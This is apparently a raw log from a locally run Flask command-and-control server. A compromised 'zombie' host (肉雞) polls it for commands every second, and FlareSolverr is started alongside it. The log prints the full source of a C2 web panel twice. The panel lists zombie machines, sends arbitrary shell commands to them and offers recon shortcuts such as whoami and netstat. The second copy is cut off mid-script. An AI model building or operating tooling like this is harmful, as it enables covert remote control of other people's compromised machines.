2025-06-25 00:15:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:15:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:15:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:15:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:15:32 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:15:32 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:15:32 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:15:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:15:32 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:15:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:15:32 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:15:32 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:15:32 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:15:32 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:15:32 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:15:32 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:15:32 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:15:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0289s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:15:38 | INFO     | control_route.py:81 | get_messages() | 用戶請求獲取消息
2025-06-25 00:15:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0083s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:15:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:38] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:15:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:38] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:15:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:38] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:15:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:39] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:15:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:15:45 | INFO     | control_route.py:81 | get_messages() | 用戶請求獲取消息
2025-06-25 00:15:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0011s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    